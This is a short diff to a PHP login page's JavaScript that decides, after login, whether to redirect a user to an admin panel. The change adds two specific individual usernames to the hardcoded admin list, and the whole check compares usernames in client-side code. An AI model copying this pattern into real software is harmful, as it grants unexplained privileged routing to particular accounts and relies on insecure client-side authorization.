@@ -367,7 +367,8 @@ if (isset($_GET['action']) && $_GET['action'] === 'logout' || isset($_GET['logou
                 if (data.phone) localStorage.setItem('ix_user_phone', data.phone);
                 if (data.fullName) localStorage.setItem('ix_user_fullname', data.fullName);
                 setTimeout(() => {
-                    if (data.isAdmin || data.username.toLowerCase() === 'admin' || data.username.toLowerCase() === 'superadmin') {
+                    const u = (data.username || '').toLowerCase();
+                    if (data.isAdmin || u === 'admin' || u === 'superadmin' || u === 'abas6245' || u === 'abazceboi') {
                         window.location.replace('secure_hq_panel.php');
                     } else {
                         window.location.replace('dashboard.php');
